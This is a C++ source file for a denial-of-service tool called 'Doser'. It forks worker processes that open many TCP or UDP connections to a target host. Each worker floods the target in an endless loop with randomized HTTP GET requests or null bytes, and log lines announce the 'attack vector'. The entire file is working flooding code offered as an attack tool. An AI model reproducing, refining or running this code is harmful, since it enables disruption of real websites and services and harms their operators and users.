#include <random>
#include <chrono>
#include <netdb.h>
#include <cstring>
#include <csignal>
#include <utility>
#include <unistd.h>
#include <iostream>
#include "Doser.h"


void Doser::attack(const int *id) {
    std::vector<int> sockets;
    int x, r;
    for (x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    signal(SIGPIPE, &Doser::broke);
    while(true) {
        static std::string message;
        for (x = 0; x < conf->CONNECTIONS; x++) {
            switch (sockets[x]){
                case 0:{
                    sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                    break;
                }
                default:break;
            }
            switch (conf->vector){
                case config::HTTPPlus:
                case (config::HTTP):{
                    std::string httpbuffer{};
                    httpbuffer = std::string{"GET /"} + createStr() + " HTTP/1.0\r\nUser-Agent: "
                                 + randomizeUserAgent() + " \r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
                    message = std::string("Buffer: ") + httpbuffer;
                    logger->Log(&message, Logger::Info);
                    r = write_socket(sockets[x], httpbuffer.c_str(), static_cast<int>(httpbuffer.length()));
                    break;
                }
                case config::NullPlus:
                case (config::Null):{
                    r = write_socket(sockets[x], "\0", 1);
                    break;
                }
                default:break;
            }
            if(conf->vector == config::HTTPPlus | conf->vector == config::NullPlus){
                read_socket(sockets[x]);
            }
            switch (r){
                case -1:{
                    close(sockets[x]);
                    sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                    break;
                }
                default:{
                    message = std::string("Socket[") + std::to_string(x) + "->"
                              + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                    logger->Log(&message, Logger::Info);
                    message = std::to_string(*id) + ": Voly Sent";
                    logger->Log(&message, Logger::Info);
                }
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(300000);
    }
}

int Doser::make_socket(const char *host, const char *port) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    std::string message = std::string("Connecting-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    switch (conf->protocol){
        case config::TCP:
            hints.ai_socktype = SOCK_STREAM;
            break;
        case config::UDP:
            hints.ai_socktype = SOCK_DGRAM;
            break;
        default:break;
    }

    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
        logger->Log(&message, Logger::Error);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        logger->Log("No connection could be made", Logger::Error);
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    message = std::string("Connected-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    return sock;
}

void Doser::broke(int) {
    // Pass
}

std::string Doser::createStr() {
    unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
    std::default_random_engine engine(seed);
    std::uniform_int_distribution<int> distribution(0, 20);
    int string_length =  distribution(engine) + 1;
    std::string string{};
    for(int i = 0; i < string_length; ++i){
        distribution = std::uniform_int_distribution<int>(0, 72);
        string += (static_cast<char>('0' + distribution(engine)));
    }
    return string;
}

void Doser::run() {
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case config::HTTPPlus:
            logger->Log("Attack Vector: HTTP plus", Logger::Info);
            break;
        case config::HTTP:
            logger->Log("Attack Vector: HTTP", Logger::Info);
            break;
        case config::Null:
            logger->Log("Attack Vector: Null", Logger::Info);
            break;
        case config::NullPlus:
            logger->Log("Attack Vector: Null plus", Logger::Info);
            break;
        default:break;
    }

    switch(conf->protocol){
        case config::TCP:
            logger->Log("Using TCP Protocol", Logger::Info);
            break;
        case config::UDP:
            logger->Log("Using UDP Protocol", Logger::Info);
            break;
        default:break;
    }

    logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);
    for (int x = 0; x < conf->THREADS; x++) {
        switch (fork()){
            case 0:break;
            default:
                attack(&x);
        }

        usleep(200000);
    }
}

Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {

}

std::string Doser::randomizeUserAgent(){
    if(conf->useragents.size() > 1){
        unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
        std::default_random_engine engine(seed);
        std::uniform_int_distribution<int> distribution(0, static_cast<int>(conf->useragents.size()));
        return conf->useragents[distribution(engine)];
    }
    return conf->useragents[0];
}

void Doser::read_socket(int socket){
    char chunk[128];
    while(read(socket , chunk, 128)){
        memset(chunk , 0 , 128);
    }
}

int Doser::write_socket(int socket, const char *string, int length) {
    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
}
